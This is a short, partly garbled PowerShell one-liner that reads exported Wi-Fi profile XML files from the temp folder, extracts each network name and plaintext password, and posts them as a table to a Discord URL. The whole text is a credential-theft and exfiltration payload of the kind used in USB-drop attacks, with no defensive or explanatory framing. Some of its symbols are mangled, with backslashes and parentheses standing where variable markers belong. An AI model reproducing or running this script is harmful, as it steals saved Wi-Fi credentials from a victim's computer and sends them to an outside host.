\$d = Get-ChildItem (Join-Path \(env:temp 'Wi*.xml') \vert{} ForEach-Object { [xml]\)x = Get-Content \(_.FullName; [PSCustomObject]@{ SSID =\)x.WLANProfile.name; Password = \(x.WLANProfile.MSM.Security.sharedKey.keyMaterial } }; if (\)d) { \(table =\)d | Format-Table -Property SSID, Password -AutoSize | Out-String; \(msg = "```text`n" + \)table + "```"; Invoke-WebRequest -Uri 'https://discord.com' -Method Post -Body (ConvertTo-Json @{ content = $msg }) -ContentType 'application/json' -UseBasicParsing }
